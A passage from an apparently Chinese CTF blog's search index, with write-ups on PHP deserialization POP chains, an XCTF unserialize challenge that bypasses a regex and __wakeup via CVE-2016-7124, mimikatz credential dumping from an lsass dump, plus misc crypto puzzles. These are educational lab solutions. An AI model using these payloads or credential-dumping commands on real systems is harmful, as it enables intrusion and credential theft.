class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">'Welcome.'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span>,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|ftp|https|dict|\.\./i"</span>,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p= <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hello'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'hello'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">'test.php'</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一步从unserialize开始，当传入参数hello进行反序列化后，会调用下面这个__wakeup()魔术方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|ftp|https|dict|\.\./i"</span>,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>进入该方法后后会进行preg_match正则匹配，可以让这里的<code>$this-&gt;source</code>是被当作字符串来（也就是原本不是字符串要报错的那种，强制当成字符串），就可以进入下面这个__toString()方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>（这里是最不好理解的一步，我也不是太懂，一个变量还能取它的成员变量，php真神奇）</p>
<p>（后记之后：现在懂了，在payload中，往str[‘str’]的值里放了一个类，而这个类中没有source这个成员变量，于是它就是调用__get()）</p>
<p>在这个方法中，会调用str数组中str这个key的值，str[‘str’]就是这个意思，str是一个数组，取里面’str’这个key的对应的值（这里它的值是一个类），就跟python里的字典是一个道理，具体的可以百度搜，然后再取这个对应的值（类）里面的source这个成员变量的值，是不存在的（payload中我们自己可以定义，所以让它不存在就行了），这个时候就会去进入Test类中的__get()魔术方法，如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个__get()魔术方法中把p的值赋给了$function并把它当作函数返回，于是会进入__invoke()这个魔术方法，如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在__invoke()中调用了file_get函数，而file_get函数则是用file_get_contents读取文件内容，其中提供给file_get的变量var是我们能控制（在payload中的Read类中定义的），就达到了读取文件的目的，至此pop链构造结束</p>
<p>总结一下就是<code>__wakeup()</code>-&gt; <code>__toString()</code> -&gt; <code>__get</code> -&gt;<code>__invoke</code> -&gt; <code>file_get</code></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $source;</span><br><span class="line">	<span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $var = <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line">$t-&gt;p = $r;</span><br><span class="line">$s-&gt;str[<span class="string">'str'</span>] = $t;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p><code>&quot;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:{s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:{s:3:&quot;var&quot;;s:8:&quot;flag.php&quot;;}}}}&quot;</code></p>
<p>将这一串赋值给hello后即可读取flag中的内容，如下图</p>
<p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p>
<p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" alt="3"></p>
<p>说句实在话这payload也看的我一脸蒙蔽（后记之后：现在懂了），php真的是疯狂套娃，类可以直接赋值给变量就很骚，就像上面这个payload最后一步<code>$s-&gt;source = $s;</code>执行后$s里的source里永远都是它本身，疯狂套娃，可以看到上面的图片，总之payload就是要在搞清楚pop链之后，想办法如何取调用每一个魔术方法，以达到读取文件的目的，还是非常绕的，还得花更多时间研究php</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>又去调试了解了一下，最后要<code>$s-&gt;source = $s;</code>，就是因为要将$s中的source变得无限套娃，这样它就不能正常被调用，只能当做字符串来处理，也就调用了__tostring()，__tostring就是要在无法正常调用时才会被触发，只能把这个对象当作字符串来处理，可以看下面这个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">""</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello,"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"!&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;<span class="comment">//在类中定义一个__toString方法</span></span><br><span class="line">        <span class="keyword">return</span>  <span class="string">"Hello,"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"!&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$WBlog = <span class="keyword">new</span> Person(<span class="string">'WBlog'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $WBlog;<span class="comment">//直接输出对象引用则自动调用了对象中的__toString()方法</span></span><br><span class="line"> </span><br><span class="line">$WBlog-&gt;say();<span class="comment">//试比较一下和上面的自动调用有什么不同</span></span><br></pre></td></tr></table></figure>

<p>程序输出：</p>
<p>Hello,WBlog!</p>
<p>Hello,WBlog! </p>
<p>如果不定义“__tostring()”方法会怎么样呢？例如在上面代码的基础上，把“ __tostring()”方法屏蔽掉，再看一下程序输出结果：</p>
<p> Catchable fatal error: Object of class Person could not be converted to string</p>
<p> 由此可知如果在类中没有定义“__tostring()”方法，则直接输出以象的引用时就会产生误法错误，另外__tostring()方法体中需要有一个返回值。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯2019-Attack</title>
    <url>/2020/08/22/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-Attack/</url>
    <content><![CDATA[<p>这道题首先是给了个挺大的流量包，foremost一下发现了一个加密的zip</p>
<p><img src="/2020/08/22/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-Attack/1.png" alt="image-20200822114521512"></p>
<p>提示密码是administeror的密码</p>
<p>再观察流量包，在导出HTTP时发现了一个34MB的lsass.dmp</p>
<p><img src="/2020/08/22/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-Attack/2.png" alt="image-20200822140440700"></p>
<p>经过百度可以知道，这是通过procdump64在Windows上通过lsass.exe进程dump出来的一个文件，可以通过mimikatz来获得明文账号密码</p>
<p>下载了一个win版的mimikatz，当然kali好像也是自带的，然后<strong>以管理员身份</strong>运行，键入如下命令</p>
<ul>
<li>privilege::debug</li>
<li>sekurlsa::minidump ../lsass.dmp //这里是文件路径</li>
<li>sekurlsa::logonpasswords full</li>
</ul>
<p><img src="/2020/08/22/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-Attack/3.png" alt="image-20200822141316699"></p>
<p>成功获得密码</p>
<p><code>W3lc0meToD0g3</code></p>
<p>打开压缩包获得flag</p>
<p><code>flag:D0g3{3466b11de8894198af3636c5bd1efce2}</code></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一篇博客</title>
    <url>/2020/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="欢迎来到我的博客！"><a href="#欢迎来到我的博客！" class="headerlink" title="欢迎来到我的博客！"></a>欢迎来到我的博客！</h1><p>一起来学习吧</p>
]]></content>
      <categories>
        <category>起航</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界Web_php_unserialize</title>
    <url>/2020/08/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-unserialize/</url>
    <content><![CDATA[<p>本文借鉴 <a href="https://www.cnblogs.com/gaonuoqi/p/11896281.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaonuoqi/p/11896281.html</a></p>
<p>打开页面得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化获得fl4g里面的内容</p>
<p>借鉴别人的代码，在本地运行一下就可以或者在线运行</p>
<p><a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">https://tool.lu/coderunner/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A = <span class="keyword">new</span> Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    $b = serialize($A);</span><br><span class="line">    <span class="comment">//string(49) "O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    $b = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$b);<span class="comment">//绕过preg_match</span></span><br><span class="line">    $b = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,$b);<span class="comment">//绕过wakeup</span></span><br><span class="line">　　 <span class="comment">//string(49) "O:+4:"Demo":2:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    <span class="keyword">echo</span> (base64_encode($b));　　<span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用+4替换成4是为了绕过preg_match的正则表达式</p>
<p>同样的把2替换成1是利用了CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<p>最后按照题目的意思encode一下base64就获取反序列化的结果，get传参即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>获得flag</p>
<p><img src="/2020/08/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-unserialize/1.png" alt="1"></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-SCTF-Misc-EasyMisc</title>
    <url>/2020/07/09/2020-SCTF-Misc-EasyMisc/</url>
    <content><![CDATA[<p>首先题目拿到一张打不开的jpg，放到winhex里发现开头为9D FF，由此知道他是把jpg给到了过来</p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/1.png" alt></p>
<p>到python里把hex倒过来再填入新文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="stringspan></span><br><span class="line">print(s[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>

<p>得到一张少了文件头的jpg，填上FF D8 FF，保存得到一张图片</p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/2.png" alt></p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/3.jpg" alt></p>
<p>查看图片属性发现为rc4加密，图片中括号里的字符串为密码</p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/4.png" alt></p>
<p>至于密文，用linux里的strings命令查看图片发现了密文，当然也可以直接用notepad++搜索rc4，也能看到</p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/5.png" alt></p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/6.png" alt></p>
<p>最后到这个在线解密rc4的网站解密一下得到flag</p>
<p><a href="http://tool.chacuo.net/cryptrc4" target="_blank" rel="noopener">rc4解密</a></p>
<p><img src="/2020/07/09/2020-SCTF-Misc-EasyMisc/7.png" alt></p>
<p><code>flag:SCTF{St@Y_@T_H0Me}</code></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>misc</tag>
        <tag>sctf2020</tag>
      </tags>
  </entry>
  <entry>
    <title>新的开始</title>
    <url>/2021/02/01/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>渐渐的又懒成了这个样子，这样下去永远都翻不了身，越来越讨厌现在的自己了，今天看看能不能当成新的开始吧。。。</p>
]]></content>
      <tags>
        <tag>瞎写</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku-黄道十二宫</title>
    <url>/2021/02/19/bugku-%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/</url>
    <content><![CDATA[<p>开局拿到一张图片，大致看了下没啥隐写，根据题目名字百度了黄岛十二宫密码，发现是个杀手密码，完全没见过(⊙ˍ⊙)</p>
<p>具体的话可以参考<a href="https://www.bilibili.com/video/av585626175/" target="_blank" rel="noopener">https://www.bilibili.com/video/av585626175/</a> 这个视频</p>
<p>简单说就是每次往下移动一位，再右移两位，得到结果直接丢azdecrypt就行</p>
<p>贴个写的辣鸡脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">'hd.txt'</span>)</span><br><span class="line">con = f.readlines()</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">print(con)</span><br><span class="line">r = []</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">s = open(<span class="string">'solve.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">136</span>):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">14</span>:</span><br><span class="line">        i = i - <span class="number">15</span></span><br><span class="line">    res += con[j][i]</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(res) % <span class="number">9</span> == <span class="number">0</span>:</span><br><span class="line">        i = m % <span class="number">9</span> + m // <span class="number">9</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line">print(len(res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res) // <span class="number">15</span>):</span><br><span class="line">    s.write(res[i * <span class="number">15</span>:i * <span class="number">15</span> + <span class="number">15</span>] + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res) // <span class="number">9</span>):</span><br><span class="line">    print(res[i * <span class="number">9</span>:i * <span class="number">9</span> + <span class="number">9</span>])</span><br></pre></td></tr></table></figure>

<p>把得到结果丢azdecrypt里面就出答案了</p>
<p><img src="/2021/02/19/bugku-%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/hd1.png" alt="hd1"></p>
<p>最后答案</p>
<blockquote>
<p>flag{alphananke}</p>
</blockquote>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
</search>
